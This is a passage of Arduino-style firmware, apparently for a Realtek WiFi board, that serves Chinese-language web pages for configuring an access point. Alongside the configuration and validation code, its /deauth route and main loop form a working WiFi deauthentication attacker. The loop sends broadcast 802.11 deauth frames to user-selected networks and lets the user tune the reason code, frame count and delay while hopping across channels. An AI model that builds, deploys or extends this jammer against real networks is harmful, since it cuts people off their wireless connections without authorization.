        <button class="btn btn-primary" type="submit">保存并重启生效</button>
        <a class="btn btn-secondary" href="/">返回控制面板</a>
      </div>
    </form>
  </div>

  <div class="card">
    <form method="post" action="/resetwifi" onsubmit="return confirm('确定要恢复出厂默认网络设置（)RAW" + String(DEFAULT_SSID) + R"RAW( / )RAW" + formatIPv4(DEFAULT_IP) + R"RAW( / )RAW" + formatIPv4(DEFAULT_MASK) + R"RAW( / DHCP )RAW" + String(DEFAULT_DHCP ? "开启" : "关闭") + R"RAW(）并重启吗？')">
      <button class="btn btn-danger" style="width:100%;" type="submit">恢复默认网络设置</button>
    </form>
  </div>
</div>

<script>
function setMask(val) {
  document.getElementById('mask').value = val;
}
function toggleDhcpWarn() {
  var on = document.getElementById('dhcp').checked;
  document.getElementById('dhcpWarn').style.display = on ? 'none' : 'block';
}
function showErr(msg) {
  var b = document.getElementById('errBox');
  b.textContent = msg;
  b.style.display = 'block';
  return false;
}
function utf8Bytes(s) {
  return window.TextEncoder ? new TextEncoder().encode(s).length : unescape(encodeURIComponent(s)).length;
}
function parseIPv4Parts(str) {
  var parts = str.split('.');
  if (parts.length !== 4) return null;
  var nums = [];
  for (var i = 0; i < 4; i++) {
    if (!/^(0|[1-9][0-9]{0,2})$/.test(parts[i])) return null;
    var n = parseInt(parts[i], 10);
    if (n < 0 || n > 255) return null;
    nums.push(n);
  }
  return nums;
}
function ipv4ToUint32(nums) {
  return (((nums[0] << 24) | (nums[1] << 16) | (nums[2] << 8) | nums[3]) >>> 0);
}
function isValidMask(nums) {
  var m = ipv4ToUint32(nums);
  if (m < 0xFF000000 || m > 0xFFFFFFFC) return false;
  var inv = (~m) >>> 0;
  return ((inv & (inv + 1)) >>> 0) === 0;
}
function validateForm() {
  var ssid = document.getElementById('ssid').value.trim();
  var pass = document.getElementById('pass').value;
  var ip = document.getElementById('ip').value.trim();
  var mask = document.getElementById('mask').value.trim();
  var dhcp = document.getElementById('dhcp').checked;

  var ssidBytes = utf8Bytes(ssid);
  if (ssidBytes < 1 || ssidBytes > 32) {
    return showErr('WiFi 名称不能为空，且 UTF-8 长度不能超过 32 字节（当前 ' + ssidBytes + ' 字节）。');
  }
  if (pass.length > 0 && (pass.length < 8 || pass.length > 63)) {
    return showErr('WiFi 密码长度必须为 8~63 位，或留空以使用无密码开放热点。');
  }
  var maskNums = parseIPv4Parts(mask);
  if (!maskNums || !isValidMask(maskNums)) {
    return showErr('子网掩码无效，请输入 /8 ~ /30 的连续有效掩码（如 255.255.255.0）。');
  }
  var ipNums = parseIPv4Parts(ip);
  if (!ipNums) {
    return showErr('IP 地址格式无效，请输入如 192.168.4.1 的 IPv4 地址。');
  }
  var ipU = ipv4ToUint32(ipNums);
  var maskU = ipv4ToUint32(maskNums);
  var invMask = (~maskU) >>> 0;
  var host = (ipU & invMask) >>> 0;
  if (ipNums[0] === 0 || ipNums[0] === 127 || ipNums[0] >= 224 || host === 0 || host === invMask) {
    return showErr('请使用有效的局域网主机 IP（首段 1~223 且非 127，且不能为当前子网的网络地址或广播地址）。');
  }

  return confirm(
    '即将保存并重启设备：\n' +
    'WiFi 名称：' + ssid + '\n' +
    'WiFi 密码：' + (pass.length ? pass : '无密码 (开放热点)') + '\n' +
    '管理 IP：' + ip + '\n' +
    '子网掩码：' + mask + '\n' +
    'DHCP 服务：' + (dhcp ? '开启' : '关闭（需手动配置静态 IP）') + '\n\n' +
    '确认应用吗？'
  );
}
</script>
</body>
</html>
)RAW";
  client.write(response.c_str());
}

void handleWiFiError(WiFiClient &client, const String &err_msg) {
  String response = makeResponse(400, "text/html") + R"RAW(
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>配置错误</title>
  <style>
    body { background:#36393e; color:#dcddde; font-family:sans-serif; padding:24px; text-align:center; }
    .box { max-width:440px; margin:40px auto; background:#2f3136; padding:22px; border-radius:8px; border-top:4px solid #f04747; }
    a { display:inline-block; margin-top:16px; padding:10px 22px; background:#4f545c; color:#fff; text-decoration:none; border-radius:4px; }
  </style>
</head>
<body>
  <div class="box">
    <h2>参数校验失败</h2>
    <p>)RAW" + htmlEscape(err_msg) + R"RAW(</p>
    <a href="/wifi">返回重新填写</a>
  </div>
</body>
</html>
)RAW";
  client.write(response.c_str());
}

void handleWiFiSavedAndReboot(WiFiClient &client, const String &title) {
  String new_ip = formatIPv4(net_cfg.ip);
  String new_mask = formatIPv4(net_cfg.mask);
  String new_ssid = htmlEscape(String(net_cfg.ssid));
  String new_pass = (strlen(net_cfg.pass) >= 8) ? htmlEscape(String(net_cfg.pass)) : String("无密码 (开放热点)");
  String new_dhcp = net_cfg.dhcp_enabled ? String("开启") : String("关闭 (需手动设置静态 IP)");
  String static_tip = net_cfg.dhcp_enabled ? String("") : String("<br><b>DHCP 已关闭：</b>请在手机/电脑上手动设置与 ") + new_ip + String(" 同网段的静态 IP（子网掩码 ") + new_mask + String("）后再访问后台。");

  String response = makeResponse(200, "text/html") + R"RAW(
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>)RAW" + htmlEscape(title) + R"RAW(</title>
  <style>
    body { background:#36393e; color:#dcddde; font-family:sans-serif; padding:20px; }
    .box { max-width:460px; margin:30px auto; background:#2f3136; padding:22px; border-radius:8px; border-top:4px solid #20c20e; }
    h2 { margin-top:0; color:#fff; }
    table { width:100%; border-collapse:collapse; margin:14px 0; }
    td { padding:8px 4px; border-bottom:1px solid #454950; font-size:14px; }
    td:first-child { color:#9ea3a8; width:38%; }
    .tip { font-size:13px; color:#b9bbbe; line-height:1.6; }
    .btn { display:block; margin-top:16px; padding:11px; background:#20a80e; color:#fff; text-align:center; text-decoration:none; border-radius:4px; font-weight:600; }
  </style>
</head>
<body>
  <div class="box">
    <h2>)RAW" + htmlEscape(title) + R"RAW(</h2>
    <table>
      <tr><td>新 WiFi 名称</td><td>)RAW" + new_ssid + R"RAW(</td></tr>
      <tr><td>新 WiFi 密码</td><td>)RAW" + new_pass + R"RAW(</td></tr>
      <tr><td>新管理地址</td><td>http://)RAW" + new_ip + R"RAW(</td></tr>
      <tr><td>新子网掩码</td><td>)RAW" + new_mask + R"RAW(</td></tr>
      <tr><td>DHCP 服务</td><td>)RAW" + new_dhcp + R"RAW(</td></tr>
    </table>
    <p class="tip">
      配置已写入 Flash，设备正在重启（约 6~10 秒完成启动与初始扫描）。<br>
      请先在手机/电脑上连接到新 WiFi 热点，再打开新管理地址。)RAW" + static_tip + R"RAW(
    </p>
    <a class="btn" href="http://)RAW" + new_ip + R"RAW(/">前往 http://)RAW" + new_ip + R"RAW( (<span id="sec">12</span>s)</a>
  </div>
  <script>
    var s = 12;
    var el = document.getElementById('sec');
    var t = setInterval(function() {
      s--;
      if (s <= 0) {
        clearInterval(t);
        location.href = 'http://)RAW" + new_ip + R"RAW(/';
      } else {
        el.textContent = s;
      }
    }, 1000);
  </script>
</body>
</html>
)RAW";
  client.write(response.c_str());
  delay(150);
  client.stop();
  delay(800);

  // 先干净关闭 DHCP 与 WiFi 驱动再软重启，防止客户端残留旧连接或驱动异常
  dhcps_deinit();
  wifi_off();
  delay(100);
  sys_reset();
}

void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain");
  response += "Not found!";
  client.write(response.c_str());
}

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);

  DEBUG_SER_INIT();
  loadNetConfig();
  startAP();

  scanNetworks();

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif

  server.begin();

  if (led) {
    digitalWrite(LED_R, HIGH);
  }
}

void loop() {
  WiFiClient client = server.available();
  if (client.connected()) {
    if (led) {
      digitalWrite(LED_G, HIGH);
    }
    String request = readHttpRequest(client);
    DEBUG_SER_PRINT(request);
    String path = parseRequest(request);
    DEBUG_SER_PRINT("\nRequested path: " + path + "\n");

    if (path == "/") {
      handleRoot(client);
    } else if (path == "/wifi") {
      handleWiFiConfig(client);
    } else if (path == "/setwifi") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      String new_ssid = "";
      String new_pass = "";
      String new_ip_str = "";
      String new_mask_str = "";
      bool has_ssid = false;
      bool has_pass = false;
      bool has_ip = false;
      bool has_mask = false;
      bool new_dhcp = false;

      for (auto &param : post_data) {
        if (param.first == "ssid") {
          new_ssid = param.second;
          new_ssid.trim();
          has_ssid = true;
        } else if (param.first == "pass") {
          new_pass = param.second;
          has_pass = true;
        } else if (param.first == "ip") {
          new_ip_str = param.second;
          new_ip_str.trim();
          has_ip = true;
        } else if (param.first == "mask") {
          new_mask_str = param.second;
          new_mask_str.trim();
          has_mask = true;
        } else if (param.first == "dhcp") {
          String v = param.second;
          v.trim();
          v.toLowerCase();
          if (v == "1" || v == "on" || v == "true") {
            new_dhcp = true;
          }
        }
      }

      uint8_t parsed_ip[4];
      uint8_t parsed_mask[4];
      if (!has_ssid || new_ssid.length() < 1 || new_ssid.length() > 32) {
        handleWiFiError(client, "WiFi 名称 (SSID) 长度必须为 1~32 字节。");
      } else if (has_pass && new_pass.length() > 0 && (new_pass.length() < 8 || new_pass.length() > 63)) {
        handleWiFiError(client, "WiFi 密码长度必须为 8~63 位，或留空以使用开放网络。");
      } else if (!has_mask || !parseRawIPv4(new_mask_str, parsed_mask) || !isValidSubnetMask(parsed_mask)) {
        handleWiFiError(client, "子网掩码无效（请输入 /8 ~ /30 的连续有效掩码，例如 255.255.255.0）。");
      } else if (!has_ip || !parseRawIPv4(new_ip_str, parsed_ip) || !isValidHostIPv4(parsed_ip, parsed_mask)) {
        handleWiFiError(client, "IP 地址无效或与所选子网掩码不匹配（不能为网络地址或广播地址）。");
      } else {
        deauth_channels.clear();
        chs_idx.clear();
        isDeauthing = false;

        memset(net_cfg.ssid, 0, sizeof(net_cfg.ssid));
        strncpy(net_cfg.ssid, new_ssid.c_str(), sizeof(net_cfg.ssid) - 1);
        memset(net_cfg.pass, 0, sizeof(net_cfg.pass));
        if (has_pass && new_pass.length() >= 8) {
          strncpy(net_cfg.pass, new_pass.c_str(), sizeof(net_cfg.pass) - 1);
        }
        memcpy(net_cfg.ip, parsed_ip, 4);
        memcpy(net_cfg.mask, parsed_mask, 4);
        net_cfg.dhcp_enabled = new_dhcp ? 1 : 0;
        saveNetConfig();

        handleWiFiSavedAndReboot(client, "网络设置已保存");
        return;
      }
    } else if (path == "/resetwifi") {
      deauth_channels.clear();
      chs_idx.clear();
      isDeauthing = false;
      setDefaultNetConfig();
      saveNetConfig();
      handleWiFiSavedAndReboot(client, "已恢复默认网络设置");
      return;
    } else if (path == "/rescan") {
      client.write(makeRedirect("/").c_str());
      scanNetworks();
    } else if (path == "/deauth") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      deauth_channels.clear();
      chs_idx.clear();
      for (auto &param : post_data) {
        if (param.first == "network") {
          int idx = String(param.second).toInt();
          if (idx >= 0 && (size_t)idx < scan_results.size()) {
            int ch = scan_results[idx].channel;
            deauth_channels[ch].push_back(idx);
            chs_idx.push_back(ch);
          }
        } else if (param.first == "reason") {
          deauth_reason = String(param.second).toInt();
        }
      }
      if (!deauth_channels.empty()) {
        isDeauthing = true;
      }
      client.write(makeRedirect("/").c_str());
    } else if (path == "/setframes") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      for (auto &param : post_data) {
        if (param.first == "frames") {
          int frames = String(param.second).toInt();
          frames_per_deauth = frames <= 0 ? 5 : frames;
        }
      }
      client.write(makeRedirect("/").c_str());
    } else if (path == "/setdelay") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      for (auto &param : post_data) {
        if (param.first == "delay") {
          int delay = String(param.second).toInt();
          send_delay = delay <= 0 ? 5 : delay;
        }
      }
      client.write(makeRedirect("/").c_str());
    } else if (path == "/stop") {
      deauth_channels.clear();
      chs_idx.clear();
      isDeauthing = false;
      client.write(makeRedirect("/").c_str());
    } else if (path == "/led_enable") {
      led = true;
      digitalWrite(LED_R, HIGH);
      client.write(makeRedirect("/").c_str());
    } else if (path == "/led_disable") {
      led = false;
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      client.write(makeRedirect("/").c_str());
    } else if (path == "/refresh") {
      client.write(makeRedirect("/").c_str());
    } else {
      handle404(client);
    }

    client.stop();
    if (led) {
      digitalWrite(LED_G, LOW);
    }
  }
  
  if (isDeauthing && !deauth_channels.empty()) {
    for (auto& group : deauth_channels) {
      int ch = group.first;
      if (ch == chs_idx[current_ch_idx]) {
        wext_set_channel(WLAN0_NAME, ch);

        std::vector<int>& networks = group.second;

        for (int i = 0; i < frames_per_deauth; i++) {
          if (led) {
            digitalWrite(LED_B, HIGH);
          }
          for (int idx : networks) {
            memcpy(deauth_bssid, scan_results[idx].bssid, 6);
            uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            wifi_tx_deauth_frame(deauth_bssid, broadcast_mac, deauth_reason);
            sent_frames++;
          }
          delay(send_delay);
          if (led) {
            digitalWrite(LED_B, LOW);
          }
        }
      }
    }
    current_ch_idx++;
    if (current_ch_idx >= chs_idx.size()) {
      current_ch_idx=0;
    }
  }

  wext_set_channel(WLAN0_NAME, current_channel);
}